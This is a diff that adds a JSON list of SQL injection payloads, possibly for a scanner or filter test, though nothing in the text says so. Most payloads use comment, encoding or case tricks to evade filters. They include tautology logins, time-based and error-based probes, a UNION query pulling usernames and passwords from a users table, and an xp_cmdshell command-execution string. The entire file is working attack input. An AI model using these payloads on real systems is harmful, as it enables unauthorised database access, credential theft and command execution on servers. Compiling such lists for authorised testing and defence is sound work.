@@ -1,0 +1,23 @@
+[
+  "'/*!OR*/1=1--",
+  "'/**/AND/**/1=CONVERT(int,/**/(SELECT/**/@@version))--",
+  "'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='5'--",
+  "'/**/UNION/**/SELECT/**/1,2,3--",
+  "'/**/UNION/**/SELECT/**/username,/**/password/**/FROM/**/users--",
+  "'+OR+1=1--",
+  "'/**/OR/**/1=1--",
+  "'%20OR%201=1--",
+  "'/**/oR/**/1=1--",
+  "'/**/UnIoN/**/sElEcT/**/1,2--",
+  "'/**/OR/**/'1'='1'/**/--",
+  "'/**/AND/**/SLEEP(5)--",
+  "'/**/OR/**/1=1#",
+  "'/**/OR/**/1=1--",
+  "';/**/WAITFOR/**/DELAY/**/'0:0:5'--",
+  "'/**/AND/**/updatexml(1,concat(0x7e,user()),1)--",
+  "'/**/AND/**/1=1/**/AND/**/'a'='a",
+  "';/**/EXEC/**/xp_cmdshell('whoami')--",
+  "'%09OR%091=1--",
+  "'/**/UNION/**/SELECT/**/NULL--",
+  "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--"
+]
